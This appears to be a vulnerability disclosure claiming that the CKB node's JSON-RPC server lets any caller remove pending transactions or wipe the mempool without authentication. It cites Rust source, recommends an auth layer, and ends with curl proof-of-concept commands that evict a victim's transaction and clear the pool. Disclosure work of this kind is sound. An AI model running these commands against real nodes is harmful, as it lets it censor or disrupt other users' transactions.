### Title
Unauthenticated `remove_transaction` and `clear_tx_pool` RPC Methods Allow Any Caller to Evict Arbitrary Pending Transactions Without Authorization - (`rpc/src/module/pool.rs`)

### Summary
The CKB JSON-RPC server exposes `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` as state-mutating pool management methods with zero access control. The RPC server itself enforces no authentication middleware — any caller who can reach the RPC port can invoke these methods unconditionally. This is directly analogous to the VaderPoolV2 `rescue` vulnerability: a function intended for privileged operators has no caller restriction, so an unprivileged RPC caller can remove any other user's pending transaction or wipe the entire mempool.

### Finding Description

**Root cause — no authentication on the RPC server:**

`rpc/src/server.rs` builds the Axum router and attaches no authentication layer:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())          // all origins allowed
    .layer(TimeoutLayer::with_status_code(…))
    .layer(Extension(stream_config));
``` [1](#0-0) 

`handle_jsonrpc` dispatches every incoming call directly to the `MetaIoHandler` with no credential check:

```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response { … io.handle_call(call, T::default()).await … }
``` [2](#0-1) 

**Privileged methods with no caller check:**

`remove_transaction` removes any transaction (and all its dependents) from the pool for any caller-supplied hash:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| { … })
}
``` [3](#0-2) 

`clear_tx_pool` wipes every pending transaction in one call:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [4](#0-3) 

`clear_tx_verify_queue` similarly drains the verification queue with no auth: [5](#0-4) 

The underlying service handler dispatches `RemoveLocalTx` and `ClearPool` messages with no identity check: [6](#0-5) [7](#0-6) 

**Exposure surface:**

The default config binds to `127.0.0.1:8114`, but the server also optionally binds TCP (`tcp_listen_address`) and WebSocket (`ws_listen_address`) listeners — both with the same zero-auth handler. Any process on the host (or any remote host if the operator exposes the port) is an equally privileged RPC caller. [8](#0-7) 

The miner client supports HTTP Basic Auth in the URL it sends *to* the node, but the server never validates it — there is no server-side auth enforcement anywhere in the codebase. [9](#0-8) 

### Impact Explanation

An unprivileged RPC caller (any local process, or any remote host if the port is reachable) can:

1. **Targeted eviction**: Call `remove_transaction` with a victim's tx hash to silently drop a high-value or time-sensitive pending transaction. The victim's transaction is not mined; the attacker can immediately submit a competing transaction (front-running / griefing).
2. **Full mempool wipe**: Call `clear_tx_pool` to atomically remove every pending transaction from the node, causing all waiting users to lose their queue position and forcing resubmission.
3. **Verification queue drain**: Call `clear_tx_verify_queue` to discard all transactions currently being verified, stalling throughput.

These are unauthorized state mutations on shared node infrastructure, directly analogous to the VaderPoolV2 `rescue` pattern: a function intended for privileged recovery is callable by anyone.

### Likelihood Explanation

- Any co-located process (malicious script, compromised dependency, container escape) can reach `127.0.0.1:8114` without any credential.
- Operators who expose the RPC for remote miner access (a documented and supported use case) make the port reachable to any network peer.
- The attack requires only a single HTTP POST with a known tx hash (obtainable from `get_raw_tx_pool`) — no cryptographic material, no special role.
- The `remove_transaction` RPC is documented and its interface is public, so the attack is trivially scriptable.

### Recommendation

Add an optional bearer-token or HTTP Basic Auth enforcement layer in the RPC server, checked before dispatching any call. Specifically:

1. Introduce a configurable `rpc_secret_token` in `RpcConfig`.
2. Add an Axum middleware (e.g., `tower_http::validate_request::ValidateRequestHeaderLayer`) that rejects requests missing the correct `Authorization` header.
3. Gate destructive methods (`remove_transaction`, `clear_tx_pool`, `clear_tx_verify_queue`, `clear_banned_addresses`, `set_ban`) behind this check even when the token is not configured, by requiring explicit opt-in to unauthenticated access.

This mirrors the fix recommended for VaderPoolV2: permission the function to only allow a designated privileged caller.

### Proof of Concept

**Step 1** — Observe a victim's pending transaction:
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns list of pending tx hashes
```

**Step 2** — Remove the victim's transaction (no credentials required):
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"remove_transaction",
       "params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"]}'
# Returns: {"result": true}
```

**Step 3** — Confirm the transaction is gone:
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_transaction",
       "params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"]}'
# tx_status.status = "unknown" — evicted from pool
```

**Full wipe variant:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Wipes entire mempool; returns null
```

No authentication, no privileged key, no special role required.

### Citations

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L218-260)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
    match req {
        Err(_error) => {
            let response = RpcResponse::from(
                Error::new(ErrorCode::ParseError),
                Some(jsonrpc_core::Version::V2),
            );

            serde_json::to_string(&response)
                .map(|json| {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        json,
                    )
                        .into_response()
                })
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
        }
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;

                if let Some(response) = result {
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L694-700)
```rust
    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
```

**File:** tx-pool/src/service.rs (L826-834)
```rust
        Message::RemoveLocalTx(Request {
            responder,
            arguments: tx_hash,
        }) => {
            let result = service.remove_tx(tx_hash).await;
            if let Err(e) = responder.send(result) {
                error!("Responder sending remove_tx result failed {:?}", e);
            };
        }
```

**File:** tx-pool/src/service.rs (L972-980)
```rust
        Message::ClearPool(Request {
            responder,
            arguments: new_snapshot,
        }) => {
            service.clear_pool(new_snapshot).await;
            if let Err(e) = responder.send(()) {
                error!("Responder sending clear_pool failed {:?}", e)
            };
        }
```

**File:** resource/ckb.toml (L177-198)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}

# By default RPC only binds to HTTP service, you can bind it to TCP and WebSocket.
# tcp_listen_address = "127.0.0.1:18114"
# ws_listen_address = "127.0.0.1:28114"
reject_ill_transactions = true
```

**File:** miner/src/client.rs (L380-394)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
```
